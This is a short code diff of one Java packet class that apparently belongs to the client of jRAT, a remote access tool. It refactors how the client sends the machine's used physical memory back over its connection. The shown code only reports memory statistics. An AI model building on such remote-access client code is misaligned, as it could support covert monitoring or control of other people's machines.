@@ -1,19 +1,19 @@
 package jrat.client.packets.outgoing;
 
 import com.sun.management.OperatingSystemMXBean;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
+
 import java.lang.management.ManagementFactory;
 
 
 public class Packet24UsedMemory extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
 		long free = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();
 
-		dos.writeLong(total - free);
+		con.writeLong(total - free);
 	}
 
 	@Override
